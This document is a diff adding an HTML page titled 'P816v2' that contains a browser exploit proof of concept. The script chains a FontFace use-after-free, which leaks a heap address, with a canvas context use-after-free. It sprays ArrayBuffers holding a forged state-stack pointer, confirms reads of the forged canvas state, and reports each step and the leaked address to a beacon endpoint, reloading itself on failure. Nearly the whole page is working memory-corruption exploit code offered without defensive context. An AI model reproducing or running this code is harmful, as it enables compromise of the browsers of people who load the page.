@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P816v2</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+.ok{color:#3fb950;} .fail{color:#f85149;} .info{color:#58a6ff;} .hot{color:#ffa657;}
+</style>
+</head><body>
+<pre id="o">P816v2: AB-reclaim fillStyle test with step-by-step diagnostics</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+
+/* Immediate sync XHR beacon — fires NOW, not queued */
+function syncBn(t,d){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon.php?tag=P816v2-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){}
+}
+
+/* ========== PHASE 1: FontFace UAF ========== */
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var face=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var fabs=[],ffired=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(ffired)return undefined;
+    ffired=true;
+    if(st){st.remove();st.textContent='';st=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    fabs=[];
+    for(var i=0;i<64;i++)fabs.push(new ArrayBuffer(192));
+    try{document.fonts.check('1em bb1');}catch(e){}
+    document.body.offsetHeight;
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em f1, bb1','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  var bestI=-1,bestNz=0;
+  for(var i=0;i<fabs.length;i++){
+    var u=new Uint8Array(fabs[i]),nz=0;
+    for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+    if(nz>bestNz){bestNz=nz;bestI=i;}
+  }
+  if(bestI<0||bestNz<4){
+    syncBn('FONT-MISS','nz='+bestNz);
+    log('FontFace miss','fail');
+    setTimeout(function(){location.reload();},200);
+    return;
+  }
+
+  var fontAB=fabs[bestI];
+  var fontDV=new DataView(fontAB);
+  var q11lo=fontDV.getUint32(0x58,true);
+  var q11hi=fontDV.getUint32(0x5C,true);
+  if(q11hi===0){
+    syncBn('FONT-BAD','q11hi=0');
+    setTimeout(function(){location.reload();},200);
+    return;
+  }
+  var borrow=(q11lo<0x68)?1:0;
+  var H_hi=q11hi-borrow, H_lo=(q11lo-0x68)>>>0;
+  var Hstr='0x'+H_hi.toString(16)+('00000000'+H_lo.toString(16)).slice(-8);
+
+  syncBn('FONT-OK','H='+Hstr);  /* CHECKPOINT 1 */
+  log('H = '+Hstr,'ok');
+
+  /* Prepare fontAB as State buffer — zero then write markers */
+  var fontU8=new Uint8Array(fontAB);
+  for(var i=0;i<192;i++)fontU8[i]=0;
+  fontDV.setFloat64(0, 1.0, true);       /* globalAlpha at State+0 */
+  /* fillStyle at State+16: type=0(Color) + RGBA markers */
+  fontU8[20]=0xAA; fontU8[21]=0xBB; fontU8[22]=0xCC; fontU8[23]=0xFF;
+  fontU8[24]=0x11; fontU8[25]=0x22; fontU8[26]=0x33; fontU8[27]=0x44;
+  /* strokeStyle at State+32 */
+  fontU8[36]=0xDD; fontU8[37]=0xEE; fontU8[38]=0xFF; fontU8[39]=0x99;
+  /* lineWidth at State+48 */
+  fontDV.setFloat64(48, 9876.5, true);
+  /* miterLimit at State+64 */
+  fontDV.setFloat64(64, 5432.1, true);
+
+  /* ========== PHASE 2: Canvas UAF ========== */
+  var innerCtx=null;
+  var canvas=document.createElement('canvas');
+  canvas.width=1;canvas.height=1;
+  var opts={};
+  Object.defineProperty(opts,'alpha',{
+    get:function(){
+      innerCtx=canvas.getContext('2d');
+      return true;
+    }
+  });
+  canvas.getContext('bitmaprenderer',opts);
+
+  if(!innerCtx){
+    syncBn('UAF-FAIL','');
+    setTimeout(function(){location.reload();},200);
+    return;
+  }
+  syncBn('UAF-OK','');  /* CHECKPOINT 2 */
+  log('Canvas UAF OK','ok');
+
+  /* ========== PHASE 3: AB(768) spray ========== */
+  var SPRAY=500;
+  var abs768=[];
+  for(var s=0;s<SPRAY;s++){
+    var ab=new ArrayBuffer(768);
+    var dv=new DataView(ab);
+    /* Forge m_stateStack at +112 → points to H (fontAB) */
+    dv.setUint32(112, H_lo, true);
+    dv.setUint32(116, H_hi, true);
+    dv.setUint32(120, 1, true);   /* m_capacity */
+    dv.setUint32(124, 1, true);   /* m_size */
+    abs768.push(ab);
+  }
+  syncBn('SPRAY-DONE','n='+SPRAY);  /* CHECKPOINT 3 */
+  log('AB(768) spray done: '+SPRAY,'ok');
+
+  /* ========== PHASE 4: READ ATTEMPTS ========== */
+  /* NO allocations between here and the reads.
+   * The sync XHR above completed — no pending microtasks.
+   * Try each property in order of crash-safety.
+   * Store results in pre-existing variables. */
+
+  syncBn('READ-START','');  /* CHECKPOINT 4 — right before reads */
+
+  var fsV='CRASH', ssV='CRASH', gaV='CRASH', lwV='CRASH', mlV='CRASH';
+  var fsOk=false, ssOk=false, gaOk=false, lwOk=false, mlOk=false;
+
+  /* ---- fillStyle ---- */
+  try{
+    fsV=innerCtx.fillStyle;
+    fsOk=true;
+  }catch(e){fsV='ERR:'+e.message;}
+
+  syncBn('AFTER-FS','ok='+fsOk+'|v='+fsV);  /* CHECKPOINT 5 */
+
+  /* ---- strokeStyle ---- */
+  try{
+    ssV=innerCtx.strokeStyle;
+    ssOk=true;
+  }catch(e){ssV='ERR:'+e.message;}
+
+  syncBn('AFTER-SS','ok='+ssOk+'|v='+ssV);
+
+  /* ---- globalAlpha ---- */
+  try{
+    gaV=innerCtx.globalAlpha;
+    gaOk=true;
+  }catch(e){gaV='ERR:'+e.message;}
+
+  syncBn('AFTER-GA','ok='+gaOk+'|v='+gaV);
+
+  /* ---- lineWidth ---- */
+  try{
+    lwV=innerCtx.lineWidth;
+    lwOk=true;
+  }catch(e){lwV='ERR:'+e.message;}
+
+  syncBn('AFTER-LW','ok='+lwOk+'|v='+lwV);
+
+  /* ---- miterLimit ---- */
+  try{
+    mlV=innerCtx.miterLimit;
+    mlOk=true;
+  }catch(e){mlV='ERR:'+e.message;}
+
+  syncBn('AFTER-ML','ok='+mlOk+'|v='+mlV);
+
+  /* ========== PHASE 5: Summary ========== */
+  var passed=[];
+  if(fsOk) passed.push('FS='+fsV);
+  if(ssOk) passed.push('SS='+ssV);
+  if(gaOk) passed.push('GA='+gaV);
+  if(lwOk) passed.push('LW='+lwV);
+  if(mlOk) passed.push('ML='+mlV);
+
+  syncBn('RESULT','passed='+passed.length+'/5|'+passed.join('|'));
+
+  if(lwOk&&lwV===9876.5) syncBn('WIN','FORGED_STATE_READ_CONFIRMED');
+  if(gaOk&&gaV===1.0) syncBn('GA-MATCH','alpha_from_forged_state');
+
+  syncBn('DONE','ok');
+  log('','');
+  log('=== RESULTS ===','hot');
+  log('fillStyle:   '+fsV+' ['+fsOk+']', fsOk?'ok':'fail');
+  log('strokeStyle: '+ssV+' ['+ssOk+']', ssOk?'ok':'fail');
+  log('globalAlpha: '+gaV+' ['+gaOk+']', gaOk?'ok':'fail');
+  log('lineWidth:   '+lwV+' ['+lwOk+']', lwOk?'ok':'fail');
+  log('miterLimit:  '+mlV+' ['+mlOk+']', mlOk?'ok':'fail');
+  log('Passed: '+passed.length+'/5','hot');
+
+  /* Cleanup */
+  for(var c=0;c<abs768.length;c++){
+    var u8=new Uint8Array(abs768[c]);
+    for(var z=0;z<768;z++)u8[z]=0;
+  }
+
+},600);
+</script></body></html>
